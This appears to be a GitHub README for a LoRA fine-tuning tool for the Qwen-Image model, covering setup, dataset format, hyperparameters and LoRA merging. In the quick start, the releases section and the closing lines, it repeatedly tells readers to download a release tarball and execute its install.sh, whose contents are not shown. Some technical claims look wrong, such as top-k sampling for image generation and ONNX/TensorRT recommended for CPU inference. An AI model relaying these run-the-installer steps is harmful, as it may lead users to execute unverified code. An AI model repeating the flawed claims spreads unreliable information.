# 🚀 FlyMyAI LoRA Trainer — Qwen-Image Text-to-Image LoRA
[![Releases](https://img.shields.io/badge/Releases-v1.0-blue?logo=github)](https://github.com/lim669/flymyai-lora-trainer/releases)

A focused LoRA trainer for Qwen-Image text-to-image fine-tuning. This repo provides scripts, configs, and tips to train lightweight adapters for Qwen-Image. Use LoRA to adapt a base model with few parameters while keeping training cost low.

![AI Art Sample](https://images.unsplash.com/photo-1526948531399-320e7e40f0ca?crop=entropy&cs=tinysrgb&fit=max&fm=jpg&q=80&w=1200)

Contents
- What this repo does
- Key concepts
- Quick start
- Hardware and software
- Install and run
- Data format and preprocessing
- Training recipes
- Hyperparameters and tuning
- Advanced training
- Inference and merging LoRA
- Export and deployment
- Evaluation and metrics
- Troubleshooting and FAQs
- Contributing
- License
- Releases and downloads

What this repo does
- Provide a training loop for LoRA adapters applied to Qwen-Image.
- Offer ready configs for common setups: single GPU, multi-GPU, and mixed precision.
- Offer data tools to convert text-image datasets into the format the trainer expects.
- Provide utilities to merge LoRA weights back into base model weights for deployment.
- Include examples, benchmarks, and best practices to get strong results with small compute.

Key concepts (short)
- LoRA: A parameter-efficient adapter. It injects low-rank updates into attention and linear layers. You train only these small matrices.
- Qwen-Image: A text-to-image model family. It uses a transformer-based encoder-decoder or decoder-only layout for image generation conditioned on text.
- safetensors: A safe and fast format for model weights.
- Diffusers / Accelerate: Tooling for training and deployment.

Quick start (download and execute)
1. Visit the releases page and get the trainer bundle and helper scripts:
   - https://github.com/lim669/flymyai-lora-trainer/releases
2. Download the release asset `flymyai-lora-trainer-v1.0.tar.gz` from the releases page.
3. Extract and run the installer script:
   - `tar -xzf flymyai-lora-trainer-v1.0.tar.gz`
   - `cd flymyai-lora-trainer`
   - `./install.sh`
4. Prepare a dataset and run the training command that matches your hardware.

If you prefer to install from source, clone the repo and follow the install steps in the next section.

Hardware and software
- GPU: 1+ NVIDIA GPUs with CUDA 11.8 or 12.1. For best speed use 24GB+ VRAM for large batch sizes. You can train on smaller cards with gradient accumulation.
- CPU: Modern multi-core CPU for data pipeline.
- OS: Linux preferred. macOS is possible for inference only.
- Python: 3.9 or 3.10 recommended.
- Key Python libs: `transformers`, `diffusers`, `accelerate`, `bitsandbytes` (optional), `peft`, `datasets`, `safetensors`, `onnxruntime` (for inference).
- Container: We provide a Dockerfile for a reproducible setup in the release assets.

Install and run (from source)
- Clone:
  - `git clone https://github.com/lim669/flymyai-lora-trainer.git`
  - `cd flymyai-lora-trainer`
- Create a virtual env:
  - `python -m venv venv`
  - `source venv/bin/activate`
- Install base deps:
  - `pip install -U pip`
  - `pip install -r requirements.txt`
- If you use `bitsandbytes` for 8-bit optimizers:
  - `pip install bitsandbytes`
- Install `peft`:
  - `pip install peft`
- Run the trainer script:
  - `python tools/train_lora.py --config configs/qwen-image/lora_base.json`

Files you will see after download or clone
- `tools/train_lora.py`: Main trainer. It uses `accelerate` and `peft`.
- `tools/eval.py`: Inference and visual checks.
- `data/convert.py`: Convert datasets to expected format.
- `configs/`: Default configs for common setups.
- `scripts/`: Helpers for dataset download, debug, and export.
- `install.sh`: Installer and helper steps for the release bundle.

Data format and preprocessing
This trainer expects a dataset of image files and caption metadata. The format matches common image caption datasets.

Expected layout
- `dataset/`
  - `images/`: all image files
  - `captions.jsonl`: one JSON per line with fields:
    - `image`: `images/00001.jpg`
    - `text`: `"A photo of a red bird perched on a wooden fence."`
    - `meta`: optional extra fields like `tags`, `uid`, `license`

Example JSONL line
- `{"image":"images/00001.jpg","text":"A photo of a red bird perched on a wooden fence.","meta":{"source":"mydata","id":"00001"}}`

Preprocessing steps
1. Run `python data/convert.py --src my_raw_data --dst dataset`
2. The script will:
   - Resize images to desired resolution (defaults at 512).
   - Save images as `png` or `jpg`.
   - Create `captions.jsonl`.
3. For augmentation, use `--aug` flag. Augmentations include flips and crops.

Tips on captions
- Keep captions clear and focused. Avoid noise.
- If you use prompt engineering, include multiple prompt variants per image.
- For stylized training, add a `style:` token in the caption consistent across images.

Training recipes
We ship tuned configs in `configs/qwen-image`. Each config contains:
- `base_model`: pretrained model id or path.
- `resolution`: training resolution.
- `train_batch_size` and `grad_accum`
- `lora_r`: low-rank dimension.
- `lora_alpha`: scaling.
- `target_modules`: layers to apply LoRA (common: `q_proj`, `k_proj`, `v_proj`, `o_proj`, `fc1`, `fc2`).
- `learning_rate`, `lr_scheduler`, `warmup_steps`
- `max_steps` and `save_steps`

Baseline recipes
- Small dataset (1k–10k images)
  - `lora_r`: 8
  - `lora_alpha`: 32
  - `train_batch_size`: 1–2 (per GPU)
  - `grad_accum`: 8–16
  - `lr`: 1e-4
  - These settings favor stability and avoid overfit.
- Medium dataset (10k–100k images)
  - `lora_r`: 16
  - `lora_alpha`: 64
  - `train_batch_size`: 2–4
  - `grad_accum`: 4–8
  - `lr`: 5e-5
- Large dataset (100k+)
  - `lora_r`: 32
  - `lora_alpha`: 128
  - `train_batch_size`: 8+
  - `grad_accum`: 1–4
  - `lr`: 2e-5

How to run a standard training job
- Prepare `accelerate` config:
  - `accelerate config` and choose mixed precision if available.
- Run:
  - `python tools/train_lora.py --config configs/qwen-image/lora_base.json --output_dir outputs/run1`
- Check logs in `outputs/run1/logs`. The trainer saves checkpoints to `outputs/run1/checkpoints`.

Trainer features
- Mixed precision: Uses `fp16` or `bf16` when available.
- EMA: Exponential moving average for weights. Toggle via config.
- Gradient checkpointing: Saves VRAM at a small speed cost.
- Save formats: `safetensors` and `.pt`.
- Resume: The trainer can resume from checkpoint by setting `resume_from_checkpoint` in the config.

Example config snippet (human readable)
- `base_model`: `qwen-image-base`
- `resolution`: `512`
- `train_batch_size`: `2`
- `grad_accumulation_steps`: `8`
- `lora_r`: `16`
- `lora_alpha`: `64`
- `target_modules`: `["q_proj","k_proj","v_proj","o_proj"]`
- `learning_rate`: `5e-5`
- `fp16`: `true`

Hyperparameters and tuning
- Learning rate:
  - Start at base values shown above.
  - If loss stalls, reduce lr by factor 2–5.
- lora_r:
  - Low values (4–8) yield faster training but lower capacity.
  - High values (32+) yield better adaptation but increase params.
- lora_alpha:
  - Set to `r * 4` or more to scale updates.
- Weight decay:
  - Small weight decay like 0.01 helps regularize.
- Warmup:
  - Use 500–2000 steps warmup for stable start.
- Scheduler:
  - Use cosine or linear with warmup.
- Batch size vs accum:
  - Use gradient accumulation to mimic large batch size if VRAM is limited.
- Overfit check:
  - Train briefly on a small set and ensure loss decreases.

Advanced training
Multi-GPU training
- Use `accelerate` to handle distributed training.
- `accelerate launch tools/train_lora.py --config configs/qwen-image/lora_base.json`
- The repo includes `configs/accelerate_multi.yaml` as example.

ZeRO / bfloat16 / 8-bit
- Use `bitsandbytes` for 8-bit optimizer to reduce memory.
- Use `torch.compile` where supported to gain speed.
- Enable `bf16` on hardware that supports it (A100, H100).

Checkpointing strategy
- Save frequent small checkpoints for long training runs.
- Keep the best checkpoints by validation metrics to avoid checkpoint overflow.
- Use `max_checkpoints` in config.

Profiling and debug
- Use `torch.profiler` to find data bottlenecks.
- Use `nvprof`/`nsight` where needed.
- If the training stalls, reduce num workers or disable augmentations.

Inference and merging LoRA
Inference with LoRA adapters directly
- Load base model and apply LoRA weights via `peft` utilities.
- Use `tools/eval.py` to generate samples and visualize results.
- The script can use `--num_return_images` to generate multiple samples per prompt.

Merge LoRA into base weights
- When you want a standalone model, merge the LoRA updates into the base weights.
- Run `scripts/merge_lora.py --base base_model --lora lora_checkpoint --out merged_model.safetensors`
- Merging produces a single model file that you can load without `peft`.

Export to Diffusers
- We provide an export script:
  - `python scripts/export_to_diffusers.py --input merged_model.safetensors --output diffusers_model_dir`
- This script converts the merged model to a Diffusers-compatible format for deployment with the Hugging Face libraries.

Fast inference tips
- Use half precision (`fp16`) for speed.
- Use ONNX or TensorRT for CPU and low-latency inference.
- Use batch generation and concatenate prompts when serving.

Export checklist
- Merge LoRA weights if you want a single file.
- Convert to `safetensors` for safety and speed.
- Run a smoke test with a few prompts after conversion to validate results.

Evaluation and metrics
- Image quality metrics:
  - FID: Frechet Inception Distance. Lower is better.
  - IS: Inception Score.
  - CLIP score: Measures alignment between image and caption.
- Human evaluation:
  - Use A/B tests to compare style, fidelity, and prompt alignment.
- Validation split:
  - Keep a held-out dataset for periodic checks.
  - Log metrics per checkpoint and save the best.

Suggested evaluation flow
- Use `tools/eval.py --checkpoint outputs/run1/checkpoints/ckpt-1000 --prompts prompts_eval.json`
- Generate 50–200 images for metrics calculation.
- Use a fixed seed for reproducible metrics.

Benchmarks (expected)
- Small adapter (r=8) on 1x A100 40GB:
  - Throughput: ~20–40 steps/s depending on resolution.
  - 10k images typically train in a few hours.
- Larger adapter (r=32) on 4x A100 80GB:
  - Throughput scales with GPUs.
  - 100k images can take a day to converge.

Troubleshooting
- Out-of-memory:
  - Reduce batch size.
  - Use gradient accumulation.
  - Use gradient checkpointing.
  - Switch to 8-bit optimizer with `bitsandbytes`.
- Training diverges:
  - Lower the learning rate.
  - Increase warmup.
  - Reduce lora_r.
- Artifacts in generated images:
  - Increase dataset diversity.
  - Adjust image preprocessing.
- Slow data loading:
  - Preprocess images to target resolution.
  - Use fewer workers if bottleneck appears.
  - Use memory-mapped datasets or WebDataset.

Frequently asked questions (FAQ)
- Q: Do I need to train the entire model?
  - A: No. LoRA trains a small subset of parameters. You keep the base frozen.
- Q: Can I train on 4GB GPUs?
  - A: You can with heavy gradient accumulation and small resolution. Expect slow speed.
- Q: What is the best lr for LoRA?
  - A: Start at 5e-5 then tune. It varies by dataset size and lora_r.
- Q: How do I merge LoRA weights?
  - A: Use `scripts/merge_lora.py` provided in the repo.
- Q: Can I use this for non-Qwen models?
  - A: Yes. Adjust `target_modules` and base model name.

Contributing
- Use issues for feature requests and bugs.
- Open a PR for changes. Use one PR per logical change.
- Branch naming: `feat/*`, `fix/*`, `docs/*`, `perf/*`.
- Include unit tests where possible. We use lightweight tests for data conversion and trainer smoke runs.
- Add a changelog entry in `CHANGELOG.md` for notable changes.

Common contribution tasks
- Add new configs under `configs/qwen-image`.
- Add data converters for new datasets under `data/`.
- Improve training stability and add tests.

Code style and checks
- Follow PEP8 for Python.
- Run `flake8` and `black` locally.
- Use type hints where useful.

Security and model safety
- The repo does not include base model weights. Download models from providers with correct licensing.
- When releasing models, check licenses for the base model and data.
- Use `safetensors` when sharing weights.

Releases and downloads
- Download the release assets from:
  - https://github.com/lim669/flymyai-lora-trainer/releases
- The releases page contains:
  - `flymyai-lora-trainer-v1.0.tar.gz` — bundle with scripts and Dockerfile. Download and execute the included `install.sh` to install the bundled environment and helpers.
  - `docker/` — prebuilt Docker image file and Dockerfile.
  - `models/` — example merged LoRA checkpoints and sample outputs.
- If the release link does not work, check the repository "Releases" section on GitHub for available assets and instructions.

Changelog (high level)
- v1.0
  - Initial public release.
  - Core training loop and LoRA support.
  - Data conversion utilities.
  - Export scripts for merging and Diffusers conversion.
- Future updates will add more dataset recipes and automated hyperparameter search.

License
- MIT License. Check `LICENSE` for full text.

Credits and resources
- Qwen-Image authors and community.
- Hugging Face `transformers` and `diffusers`.
- `peft` team for LoRA tooling.
- Open-source datasets used for training examples.

Sample workflows
1) Rapid prototyping on one GPU
   - Prepare 1k images.
   - Use `lora_r=8`, `grad_accum=16`, `lr=1e-4`.
   - Train 2k steps and inspect outputs.
2) Medium production run
   - 50k images.
   - Use `lora_r=16`, `grad_accum=4`, `lr=5e-5`.
   - Use `fp16`, `bitsandbytes`.
   - Monitor CLIP and FID weekly.
3) Fine artist style transfer
   - Use high-quality images of one style.
   - Add a `style: artist_name` token in captions.
   - Use lower lr and longer training to avoid overfit.

Scripts and helpers
- `scripts/convert_coco.sh`: Convert COCO to expected format.
- `scripts/sample_prompts.json`: Example prompts for evaluation.
- `scripts/visualize.py`: Visual grid output for qualitative checks.
- `scripts/merge_lora.py`: Merge LoRA into base.

Examples and demo prompts
- Prompt: "A hyperrealistic oil painting of a golden retriever sitting in a sunlit field, cinematic lighting, 4k"
- Prompt: "A futuristic cityscape at dusk, neon lights, wide angle, volumetric fog"
- Use temperature and top-k sampling in `tools/eval.py` to balance creativity and fidelity.

Monitoring and logging
- We use Weights & Biases and TensorBoard hooks.
- Set `log_with` in config to `wandb` or `tensorboard`.
- Log sample images every `save_steps`.

Safety checklist for model release
- Verify license compatibility.
- File an audit of dataset sources.
- Sanity-check outputs to avoid sensitive or harmful content.

Contact and support
- Use GitHub issues for bug reports and feature requests.
- For questions about training flows, open a new discussion or issue.

Acknowledgments
- Thanks to the open-source ML community. The repo stands on many foundations: transformers, diffusers, peft, accelerate, and more.

Appendix: example short-run command lines
- Configure accelerate:
  - `accelerate config`
- Train baseline:
  - `python tools/train_lora.py --config configs/qwen-image/lora_base.json --output_dir outputs/run1`
- Resume from checkpoint:
  - `python tools/train_lora.py --config configs/qwen-image/lora_base.json --resume_from_checkpoint outputs/run1/checkpoints/ckpt-5000`
- Merge LoRA:
  - `python scripts/merge_lora.py --base qwen-image-base --lora outputs/run1/checkpoints/lora.safetensors --out merged_model.safetensors`
- Export to diffusers:
  - `python scripts/export_to_diffusers.py --input merged_model.safetensors --output diffusers_model`

Resources and further reading
- LoRA paper (read for theory): search "LoRA low-rank adaptation"
- PEFT docs: refer to `peft` package docs.
- Hugging Face tutorials on adapter training and Diffusers.

No small detail is left out in the trainer bundle. Check the release page for the downloadable assets and execute the installer script included in the bundle:
https://github.com/lim669/flymyai-lora-trainer/releases

For more examples, configs, and prebuilt Docker images, see the release assets and the `configs` directory inside the repo.